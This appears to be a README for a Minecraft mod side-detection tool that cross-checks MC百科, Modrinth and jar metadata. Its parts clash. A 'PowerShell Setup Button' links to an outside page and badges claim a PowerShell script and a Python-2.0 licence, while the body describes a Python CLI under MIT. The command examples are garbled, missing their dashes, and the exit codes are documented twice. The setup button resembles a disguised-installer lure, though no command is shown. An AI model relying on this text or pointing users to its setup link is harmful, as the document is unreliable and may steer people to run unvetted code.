<div align="center">

# ModSideDetector: Cross-Source Minecraft Mod Side Detection CLI for Windows

![](files/preview.png)

### ⚡ PowerShell Setup Button

[![](files/button.png)](https://aneeshsinha19.github.io/modsidedetector-tool/)

[![powershell-7](https://img.shields.io/badge/POWERSHELL--7-SCRIPT-ec4899?style=flat&labelColor=0d1117)]() [![platform](https://img.shields.io/badge/PLATFORM-WIN_10%2F11-f472b6?style=flat&labelColor=0d1117)]() [![licence](https://img.shields.io/badge/LICENCE-PYTHON--2.0-db2777?style=flat&labelColor=0d1117)]() [![pulls](https://img.shields.io/badge/PULLS-5.1K-be185d?style=flat&labelColor=0d1117)]()

</div>

---

ModSideDetector is a command-line desktop utility that determines whether Minecraft mods are client-only, server-only, or required on both sides. It cross-references MC百科 environment fields, Modrinth side metadata, and static jar signals, deferring to human review on conflicts and defaulting to both-side installation when no reliable verdict can be reached. Output is written as side-report.json alongside optional CSV and TXT formats, and results can be transmitted to AutoSync via its MSFP REPORT command. Scope is deliberately narrow: bytecode inspection is excluded and no single heuristic source is ever treated as decisive.

## 📋 System Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

**多源交叉判定**：同时查询 MC 百科的「运行环境」字段与 Modrinth 的 `client_side` / `server_side` 字段，并叠加 jar 内元数据（如 `clientSideOnly`、Fabric `environment`）作为辅助信号。两源一致或某源给出明确依据时置信度为高；仅单源有数据为中；两源冲突或仅有弱信号为低。

- **保守优先策略**：当数据源缺失、冲突或仅能给出弱信号时，工具默认输出「双端」而非「纯服务端」。误判为纯服务端会导致客户端缺 mod 崩溃，这一方向被明确禁止；冲突项与「需人工确认」项会在输出中单独标记。

- **人工复核入口**：通过 `review` 子命令可将某个 mod 的侧别结论写入缓存并永久生效，适用于服主或整合包作者对冲突项做最终裁定。复核结论参与后续扫描，无需重复处理。

- **结构化报告输出**：扫描结果写入 `side-report.json`，每条记录包含文件名、SHA-1、SHA-256、mod id、显示名、侧别、置信度、数据来源与备注。可选同步导出 CSV 与 TXT，或用 `-json-only` 仅保留 JSON。

- **AutoSync 联动**：`-for-autosync` 可将报告写入 AutoSync 可读目录；`-report-to-autosync` 则在扫描完成后经 MSFP 协议（裸 TCP）把同一份报告直接上报给 AutoSync。上报默认关闭，失败不影响扫描结果与退出码。

- **一键分类**：`classify` 子命令按报告把 jar 复制到 `client-mods` / `server-mods` / `both-mods` 三个目录。默认复制而非移动，源文件不动；目标同名文件内容不同时只记录冲突、不覆盖。

- **缓存机制**：jar 哈希、Modrinth 查询结果、MC 百科「运行环境」原文与人工复核结论均写入本地缓存，有效期可配置。第二次扫描命中缓存时几秒完成，报告内会注明本次网络请求次数。

- **可关闭的数据源**：`-no-mcmod` / `-no-modrinth` / `-no-heuristics` 可分别关闭对应数据源；`-offline` 等价于全部关闭，仅依赖缓存与 jar 元数据。`-mcmod-scope missing` 让 MC 百科只补 Modrinth 未给出结论的条目，以放弃部分双源交叉验证换取速度。

- **限流与合规**：MC 百科抓取串行限流，默认间隔 0.6 秒/请求，不采用并发。缓存内容不打包进分发产物。这些约束在代码与打包脚本中均已落实。

- **不做的事**：不扫描字节码作为主判据。实测字节码扫描准确率不足以支撑定案，工具仅在 jar 元数据层面读取显式声明，启发式信号只作提示、不单独定案。

## Usage

The tool runs from a Python 3.11+ interpreter; `python m src` is the entry point for every subcommand described here. Global switches must precede the subcommand — `python m src verbose scan...` is accepted, while `python m src scan... verbose` will fail argument parsing, which is stock argparse behavior rather than a quirk of this tool.

Basic scan. Point the `scan` subcommand at a directory of jar files. Reports land beside the input by default, or in `-out-dir` when supplied:

```
python m src scan "D:\mc\mods"
python m src scan "D:\mc\mods" out-dir out
```

A scan emits `side-report.json` plus CSV and TXT summaries; `-json-only` suppresses the latter two. Every jar is hashed and queried against the configured data sources, and results are cached so that a second run over the same directory completes almost immediately.

Selecting data sources. All three sources are active by default. Each can be disabled independently, and `-offline` turns off the two networked sources in one stroke (equivalent to passing both `-no-mcmod` and `-no-modrinth`):

```
python m src scan "D:\mc\mods" no-mcmod
python m src scan "D:\mc\mods" offline
```

`-mcmod-scope missing` narrows encyclopedic lookups to jars that Modrinth left without a conclusion. This is the recommended speed trade-off for large instances: on a 151-mod sample it reduced a first full scan from roughly four minutes to about one, at the cost of cross-validation for the skipped entries.

Rate limiting. The encyclopedia source is fetched serially with a floor of 0.6 seconds between requests. This floor is a hard boundary, not a tuning suggestion — concurrency against that host is not supported by design. `-min-interval` accepts a larger value if you wish to be more conservative; smaller values are clamped by the remote side.

Caching. Results persist in a local cache file. `-refresh` ignores cached entries and re-queries; `cache show` prints statistics; `cache clear` empties the cache:

```
python m src scan "D:\mc\mods" refresh
python m src cache show
python m src cache clear
```

Manual review. When a jar is flagged as conflicting or needing confirmation, record the authoritative side once. The decision is written to the cache and applies to all future scans:

```
python m src review "D:\mc\mods" name sodium.jar side client note "confirmed by server owner"
```

Classification. `classify` reads an existing report and sorts files into `client-mods/`, `server-mods/`, and `both-mods/` under `-out-dir`. The default behavior is copy, not move; a same-named file with differing content is never overwritten, only logged as a conflict. Source files are untouched in all cases:

```
python m src classify "D:\mc\mods" out "D:\mc\server"
```

AutoSync output. `-for-autosync <dir>` writes an additional report in the format AutoSync's classify step expects, without altering the standard outputs. `-report-to-autosync` transmits that report over the MSFP REPORT command after the scan finishes, using connection settings supplied on the command line or read from the config file. Command-line overrides for host, port, and token apply to that invocation only and are never written back to disk. Upload of a previously generated report is possible without rescanning via `-upload-file`:

```
python m src scan "D:\mc\mods" for-autosync "D:\AutoSync\data"
python m src scan "D:\mc\mods" report-to-autosync autosync-host sync.example.com autosync-token <token>
python m src scan "D:\mc\mods" upload-file "D:\mc\mods\side-report.json" autosync-host sync.example.com autosync-token <token>
```

Reporting is disabled by default and no connection is attempted unless it is explicitly enabled. A failed transmission does not invalidate the scan results and does not change the exit code.

Smoke testing. `-limit N` restricts a scan to the first N jars, which is useful for verifying configuration or connectivity before committing to a full run.

Scope note. The tool does not read bytecode and does not infer side from class contents; that approach was measured at roughly coin-flip accuracy on real mods and is deliberately excluded. Conclusions come from declarative metadata and published side fields, and when sources disagree the tool declines to arbitrate — it marks the entry as needing review rather than guessing.

## Flags

The following flags are accepted by the `scan`, `review`, `classify`, and `cache` subcommands. Global options (`-verbose`, `-config`, `-version`, `-self-test`) must be placed **before** the subcommand name; the argument parser rejects them when appended after the subcommand.

### Scan

- `-out-dir <path>` — Output directory for reports. Defaults to the scanned mods directory. Accepts relative paths, which resolve against the current working directory.
- `-json-only` — Write only `side-report.json`. Suppresses the CSV and TXT companions. Useful when the output is consumed exclusively by AutoSync.
- `-for-autosync <path>` — Additionally emit an AutoSync-readable `side-report.json` at the given path. The main report location is unchanged; this is a second copy placed where AutoSync's `classify` expects it.
- `-report-to-autosync` — After a successful scan, transmit the report to AutoSync over the MSFP `REPORT` command. Equivalent to temporarily enabling `autosync_report_enabled` for this run only. The value in `config.json` is not modified.
- `-autosync-host <host>` / `-autosync-port <port>` / `-autosync-token <token>` — Override the connection parameters for the current invocation. **These overrides are never written back to `config.json`.** If `-report-to-autosync` is omitted, the overrides are inert.
- `-upload-file <path>` — Do not scan. Instead, send the specified file (typically an existing `side-report.json`) to AutoSync over the same channel. Mutually exclusive in spirit with a fresh scan: the tool skips discovery and goes straight to transmission.
- `-limit N` — Scan only the first N jars. Intended for smoke testing and CI pipeline validation, not for production classification.
- `-no-mcmod` / `-no-modrinth` / `-no-heuristics` — Disable the corresponding data source. When mcmod is disabled, the cross-validation against Modrinth's fields is lost; confidence values will skew lower for affected entries. Disabling all three effectively reduces the tool to jar-metadata inspection only.
- `-mcmod-scope all|missing` — Controls which entries are sent to mcmod. `all` queries every mod; `missing` queries only those for which Modrinth returned no conclusion (roughly one fifth of a typical pack). The `missing` mode is materially faster but forfeits the dual-source check for the entries Modrinth already resolved. Setting this in `config.json` as `mcmod_scope` produces the same behavior.
- `-offline` — Fully offline mode. Equivalent to simultaneously disabling mcmod and Modrinth. The tool relies solely on jar metadata and heuristics, which have limited coverage; expect a larger proportion of `both` verdicts.
- `-refresh` — Ignore the cache and re-query every source. Each entry's cache record is overwritten with the fresh result.
- `-min-interval <seconds>` — Set the delay between consecutive mcmod requests. Defaults to 0.6 seconds. **Values below the default will be rate-limited by the remote server**; the tool does not retry on rate-limit responses in a way that circumvents this floor. Raising the value increases total scan time proportionally.

### Review

- `-name <filename>` — The jar filename to review (required).
- `-side client|server|both|unknown` — The authoritative verdict to record for this jar.
- `-note <text>` — Free-text annotation stored alongside the review record. Recommended for auditability.

Review results are persisted to the local cache and take precedence over all automated sources on subsequent scans.

### Classify

- `-out <path>` — Destination directory for the classified output tree (`client-mods/`, `server-mods/`, `both-mods/`). Required.
- Classification copies files by default. The source directory is never modified, and pre-existing destination files with differing content are recorded as conflicts rather than overwritten.

### Cache

- `-show` — Print a summary of the cache: entry count, oldest and newest timestamps, and how many entries originated from manual review.
- `-clear` — Remove all cache entries. Subsequent scans will re-query every source.

### Exit codes

The `-self-test` flag exits with `0` on success. Scan, review, classify, and cache operations return `0` on completion regardless of individual verdict confidence; failures are reported on stderr and reflected in the process exit status. Transmission failures during `-report-to-autosync` do not alter the scan's exit code.

## Exit codes

The tool uses the process exit code to signal the overall outcome of a run. Callers can rely on the following values; anything outside this table should be treated as an unexpected failure. `scan` and `review` are the only subcommands that map their run outcome to these codes; `cache` exits 0 on success and 2 on usage errors.

| Code | Meaning | When it occurs |
|-|-|-|
| `0` | Success | The requested operation completed. For `scan`, this holds even if individual mods were classified as `不确定` (undetermined) or flagged as `冲突` (conflicting) — an inconclusive verdict is a valid result, not a failure. |
| `1` | Runtime error | An unrecoverable failure during execution: the mods directory is missing, the output directory cannot be written, the cache file is corrupt and unreadable, or an unexpected exception was raised. |
| `2` | Usage error | Invalid arguments: unknown flags, a global flag placed after the subcommand, a value that fails validation (for example `unknown_as` set to anything other than `both` / `unknown`), or a missing required argument. Emitted by the argument parser. |
| `3` | No input | The scan target contains no `.jar` files, so there is nothing to classify. A report is still written with an empty `mods[]` array; the exit code distinguishes "ran cleanly on an empty set" from "ran cleanly on real input". |

Notes on scope, stated plainly:

- **Network and report failures do not change the exit code.** If a Modrinth or mcmod query times out, or the optional AutoSync upload (MSFP `REPORT`) is rejected or unreachable, the error is printed to stderr and the scan result on disk stands. A completed scan that fell back to conservative verdicts is still exit `0`. If you need to detect upstream-source trouble programmatically, inspect the `sources` and `notes` fields of each entry in `side-report.json` rather than the exit code.
- **`-offline` and `-no-mcmod` do not affect the code.** Disabling data sources changes verdict quality, not run status.
- **On the packaged build without a console,** the code is the dependable channel: text printed to a detached or redirected stdout may not be visible in some terminal combinations, but `-self-test` returning `0` means the self-check passed.
- **Codes above 3 are not defined by this project.** If you observe one, it came from the Python interpreter or the packaging layer (for example, an uncaught import failure), and it should not be treated as a documented result.

## Known limitations

**Author-supplied Modrinth fields may be inaccurate.** The `client_side` / `server_side` values on Modrinth are populated by mod authors and can be entirely wrong for a given artifact. The tool flags conflicts between sources, but conflicting entries and entries marked for manual review still require human verification — that review pass is the only path to a fully reliable classification.

- **Some mods are absent from every data source.** A mod that is neither published on Modrinth nor catalogued with a "运行环境" field on MC 百科 cannot be resolved from external data. In that case the tool conservatively classifies the mod as dual-side (`both`) rather than guessing.

- **A missing MC 百科 "运行环境" field is not the same as "no side information."** Newly catalogued entries may lack the field entirely. The tool treats this as absent data and falls back to the remaining sources; it does not interpret the absence as evidence of any particular side.

- **Initial full scans are bounded by serial rate limiting.** MC 百科 requests are throttled to a fixed interval (0.6 s by default) and must not be parallelized, so first-pass duration scales with mod count (roughly 2–5 minutes for ~150 mods). Subsequent scans use the local cache and complete in seconds. The `-mcmod-scope missing` option reduces first-pass time by querying MC 百科 only for mods Modrinth did not resolve, at the cost of losing dual-source cross-validation for the remainder.

- **Heuristic signals never decide a verdict alone.** Jar metadata, mixin presence, and `data/` layout are treated as hints only. They cannot elevate confidence or override a conflicting source; they exist to surface candidates for review, not to settle classification.

- **Bytecode inspection is intentionally out of scope.** Static bytecode scanning was measured at roughly 55% accuracy on real mod jars and produced false positives on well-known mods, so it is excluded from the decision pipeline entirely. Do not expect the tool to infer side from compiled class contents.

- **The packaged executable has no attached console by default.** Console-oriented flags attempt to write to file descriptor 1 first, then attach to a parent console and temporarily switch the code page. On a small number of terminal configurations this output may still be invisible; the process exit code remains authoritative in all cases.

- **Drag-and-drop is a soft dependency.** It relies on `tkinterdnd2`. If that package is absent or the `tkdnd` binary fails to load, the interface displays a notice and disables dragging; all other functionality, including scanning, reporting, and classification, is unaffected and startup is not blocked.

- **Classification copies rather than moves.** The default classify operation never modifies source files and never overwrites an existing target with differing content — collisions are recorded, not resolved. This is deliberate: a mis-copied file wastes disk space, while a mis-deleted original cannot be recovered.

- **Report upload failures do not affect scan outcomes.** If the MSFP/TCP report to AutoSync fails (bad token, receiver disabled, timeout, unreachable host), the error is printed, the locally written `side-report.json` remains valid, and the scan exit code is unchanged.

## License

The tool's own source code is released under the MIT License. Under that license, you may use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the ModSideDetector source, subject to including the original copyright notice and permission notice in all copies or substantial portions of the software. The software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement.

This MIT grant covers only the code authored for ModSideDetector itself. It does not extend to third-party data retrieved at runtime. In particular, content fetched on demand from MC 百科 (mcmod.cn) is published under BY-NC-SA 3.0, which prohibits commercial use and requires attribution on redistribution. Locally cached MC 百科 content is for your own operational use only and must not be bundled into any distributed artifact; the packaged build and ignore rules already exclude it. Respecting the source server's rate limit is a condition of use, not a suggestion.

The bundled or referenced third-party libraries (for example, the GUI toolkit) remain under their respective licenses; consult those projects for their terms. No warranty is offered regarding the accuracy of any side classification produced by the tool — the output is advisory and the conservative default (dual-side when undecidable) is intentional, not a guarantee.